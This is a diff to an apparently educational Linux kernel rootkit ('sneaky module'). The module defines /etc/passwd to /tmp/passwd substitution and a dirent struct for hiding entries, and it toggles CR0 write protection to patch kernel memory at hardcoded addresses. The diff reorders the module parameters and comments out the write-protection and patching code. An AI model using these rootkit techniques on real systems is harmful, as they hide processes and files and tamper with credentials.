@@ -19,21 +19,21 @@
 #define REAL_PWD "/etc/passwd"
 #define FAKE_PWD "/tmp/passwd"
 
+static char *sneaky_pid = "000000";
+module_param(sneaky_pid, charp,
+             S_IWUSR | S_IRUSR | S_IXUSR | S_IRGRP | S_IROTH);
+
+MODULE_PARM_DESC(sneaky_pid, "this is the sneaky_process pid");
+MODULE_LICENSE("GPL");
+MODULE_AUTHOR("Haili Wu");
+MODULE_DESCRIPTION("You can not see me.");
+
 struct linux_dirent {
   unsigned long d_ino;
   unsigned long d_off;
   unsigned short d_reclen;
   char d_name[1];
 };
-
-static char *sneaky_pid = "0000000000000000";
-module_param(sneaky_pid, charp,
-             S_IWUSR | S_IRUSR | S_IXUSR | S_IRGRP | S_IROTH);
-
-MODULE_PARM_DESC(sneaky_pid, "sneaky_process pid");
-MODULE_LICENSE("GPL");
-MODULE_AUTHOR("Haili Wu");
-MODULE_DESCRIPTION("You can not see me.");
 
 void (*pages_rw)(struct page *page, int numpages) = (void *)0xffffffff810707b0;
 void (*pages_ro)(struct page *page, int numpages) = (void *)0xffffffff81070730;
@@ -128,7 +128,8 @@ static int initialize_sneaky_module(void) {
 
   // See /var/log/syslog for kernel print output
   printk(KERN_ALERT "Sneaky module being loaded.\n");
-
+  printk(KERN_ALERT "sneaky_pid is %s\n", sneaky_pid);
+  /*
   // Turn off write protection mode
   write_cr0(read_cr0() & (~0x10000));
   // Get a pointer to the virtual page containing the address
@@ -151,7 +152,7 @@ static int initialize_sneaky_module(void) {
   pages_ro(page_ptr, 1);
   // Turn write protection mode back on
   write_cr0(read_cr0() | 0x10000);
-
+  */
   return 0; // to show a successful load
 }
 
@@ -159,7 +160,7 @@ static void exit_sneaky_module(void) {
   struct page *page_ptr;
 
   printk(KERN_ALERT "Sneaky module being unloaded.\n");
-
+  /*
   // Turn off write protection mode
   write_cr0(read_cr0() & (~0x10000));
 
@@ -178,7 +179,7 @@ static void exit_sneaky_module(void) {
   // Revert page to read-only
   pages_ro(page_ptr, 1);
   // Turn write protection mode back on
-  write_cr0(read_cr0() | 0x10000);
+  write_cr0(read_cr0() | 0x10000);*/
 }
 
 module_init(initialize_sneaky_module); // what's called upon loading
